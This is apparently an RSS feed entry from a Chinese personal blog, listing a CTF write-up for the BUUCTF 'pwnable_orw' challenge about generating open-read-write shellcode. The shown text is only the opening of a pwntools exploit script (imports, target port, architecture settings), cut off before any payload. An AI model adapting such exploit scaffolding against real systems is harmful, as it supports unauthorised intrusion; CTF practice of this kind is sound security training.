channel.title: 生成ORW shellcode on Peter Liu的个人博客
channel.description: Recent content in 生成ORW shellcode on Peter Liu的个人博客

item.title: 【生成ORW shellcode】BUUCTF pwnable_orw
item.description: 原题链接 exp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = "./orw" libc_name:str = "" port: str = "26851" if_32: bool = True if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level="debug", arch="i386" if if_32 else "amd64", os="linux") context.terminal =
